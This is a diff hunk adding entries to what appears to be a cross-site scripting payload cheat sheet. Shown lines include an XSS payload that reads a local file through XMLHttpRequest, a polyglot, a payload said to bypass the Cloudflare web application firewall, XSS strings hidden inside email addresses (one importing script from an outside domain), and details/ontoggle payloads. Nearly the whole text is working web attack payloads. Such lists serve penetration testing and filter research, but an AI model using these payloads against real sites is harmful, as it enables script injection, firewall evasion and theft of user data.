@@ -99,3 +99,19 @@ xss + lfi <script>x = new XMLHttpRequest(); x.open('GET', 'file:///daab2a45fd5c4
 ```js
 '"/test/></title/</script/</style/-->{{7*7}}<iframe/onload='alert``'<!--
 ```
+---
+bypassing the Cloudflare WAF:
+```js
+"%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e" 
+```
+xss for email:
+```js
+"><img/src/onerror=import('//domain/')>"@yourdomain.com
+test+(<script>alert(0)</script>)@example.com
+test@example(<script>alert(0)</script>).com
+"<script>alert(0)</script>"@example.com
+```
+```js
+<details open id="' &quot;'"ontoggle=alert()>
+<details/open/id="&quot;"ontoggle=alert()>
+```
